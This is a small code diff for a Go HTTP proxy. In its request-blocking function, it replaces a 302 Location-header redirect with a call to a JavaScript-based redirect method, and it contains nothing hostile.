@@ -1155,11 +1155,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	}
 
 	if redirect_url != "" {
-		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-		if resp != nil {
-			resp.Header.Add("Location", redirect_url)
-			return req, resp
-		}
+		return p.javascriptRedirect(req, redirect_url)
 	} else {
 		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
 		if resp != nil {
